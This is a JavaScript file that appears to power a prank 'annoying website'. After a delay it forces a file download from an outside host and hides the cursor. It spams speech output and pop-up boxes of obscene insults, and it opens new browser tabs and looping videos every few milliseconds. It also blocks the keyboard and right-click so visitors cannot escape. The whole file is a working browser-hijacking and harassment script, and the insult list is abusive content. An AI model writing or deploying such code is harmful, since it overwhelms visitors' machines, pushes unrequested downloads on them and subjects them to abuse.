function annoyingWebsite() {
  function annoyingFileDownload() {
    var imageLink =
      "https://kindevils.rocks/api/raw/?path=/caspi/photo_2022-12-21_15-45-08.jpg&odpt=134f15aafeb28fdca4974fabb800fec952b4b2747cc4d99a80ae3591dc7cd5e7";
    var a = document.createElement("a");
    a.href = imageLink;
    a.download = imageLink;
    a.click();
  }

  annoyingFileDownload();
  function cursorGone() {
    document.querySelector("html").style = "cursor: none;";
  }

  function speak() {
    var msg = new SpeechSynthesisUtterance();
    var voices = window.speechSynthesis.getVoices();
    msg.voice = voices[12];
    msg.voiceURI = "native";
    msg.volume = 1;
    msg.rate = 1;
    msg.pitch = 1;
    msg.text = "कैसे हो";
    msg.lang = "hi-IN";
    speechSynthesis.speak(msg);
  }
  setInterval(speak, 1);
  cursorGone();

  var words = [
    "Fuck your Sister",
    "Fuck your MOM",
    "You Are a Shit",
    "You Are a Motherfucker",
    "You Are a Piece of shit",
    "You Are a Wanker",
    "You Are a Dork",
    "You Are a Fuckface",
    "You Are a Bitch",
    "You Are a Scumbag",
  ];
  function annoyingWords() {
    var fullWidth = window.innerWidth;
    var fullHeight = window.innerHeight;
    var random = Math.floor(Math.random() * 10);

    var elem = document.createElement("p");
    elem.textContent = words[random];
    elem.style.position = "absolute";
    elem.style.left = Math.round(Math.random() * fullWidth) - 150 + "px";
    elem.style.top = Math.round(Math.random() * fullHeight) - 150 + "px";
    elem.style.backgroundColor = "#f20000";
    elem.style.color = "#fff";
    elem.style.height = "80px";
    elem.style.width = "fit-content";
    elem.style.borderRadius = "20px";
    elem.style.paddingLeft = "25px";
    elem.style.paddingRight = "25px";
    elem.style.display = "flex";
    elem.style.justifyContent = "center";
    elem.style.alignItems = "center";
    document.body.appendChild(elem);
  }

  function showVideo() {
    var vidsArray = ["rickroll"];
    var fullWidth = window.innerWidth;
    var fullHeight = window.innerHeight;
    var random = Math.floor(Math.random() * 10);
    var vid = document.createElement("video");
    vid.src = `./vids/${vidsArray[0]}.mp4`;
    vid.loop = true;
    vid.muted = true;
    vid.autoplay = true;
    vid.style.position = "absolute";
    vid.style.left = Math.round(Math.random() * fullWidth) - 150 + "px";
    vid.style.top = Math.round(Math.random() * fullHeight) - 150 + "px";
    vid.style.height = "150px";
    vid.style.width = "250px";
    document.body.appendChild(vid);
  }

  function annoyingTabs() {
    function openTabs() {
      window.open("http://google.com/search?q=" + "hi");
    }
    setInterval(openTabs, 1);
  }
  setTimeout(annoyingTabs, 444);
  var toomanyWords = setInterval(annoyingWords, 1);

  setTimeout(function () {
    clearInterval(toomanyWords);
  }, 333);
  function annoyingVideos() {
    setInterval(showVideo, 111);
  }
  setTimeout(annoyingVideos, 333);
}

document.onkeydown = function (e) {
  return false;
};
document.onkeyup = function (e) {
  return false;
};
document.onkeypress = function (e) {
  return false;
};
function redirectOut() {
  document.querySelector(".body").style.display = "none";
}
document.addEventListener("contextmenu", (event) => event.preventDefault());
setTimeout(redirectOut, 3999);
setTimeout(annoyingWebsite, 4000);
